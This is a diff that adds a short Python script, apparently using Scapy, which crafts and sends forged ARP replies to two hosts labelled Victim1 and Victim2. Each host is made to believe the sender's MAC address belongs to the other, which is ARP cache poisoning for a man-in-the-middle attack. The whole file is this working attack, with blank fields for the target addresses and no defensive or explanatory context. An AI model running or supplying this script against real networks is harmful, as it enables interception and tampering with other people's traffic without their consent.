@@ -1,0 +1,40 @@
+----
+my_mac = ""             # Insert your MAC address
+victim1_mac = ""        # Insert the MAC address of Victim1
+victim1_ip = ""         # Insert the IP address of Victim1
+victim2_mac = ""        # Insert the MAC address of Victim2 
+victim2_ip = ""         # Insert the IP address of Victim2
+
+# -- ARP to Poison Victim 1 to pretend to be Victim 2 --
+a = Ether()
+a.src= my_mac
+a.dst= victim1_mac
+a.type= 0x0806
+
+b = ARP()
+b.op= 2
+b.hwsrc= my_mac
+b.psrc= victim2_ip
+b.hwdst= victim1_mac
+b.pdst= victim1_ip
+
+# -- ARP to Poison Victim 2 to pretend to be Victim 1 --
+c = Ether()
+c.src= my_mac
+c.dst= victim2_mac
+c.type= 0x0806
+
+d = ARP()
+d.op= 2
+d.hwsrc= my_mac
+d.psrc= victim1_ip
+d.hwdst= victim2_mac
+d.pdst= victim2_ip
+
+a.show()
+b.show()
+c.show()
+d.show()
+
+sendp(a/b); sendp(c/d)
+----
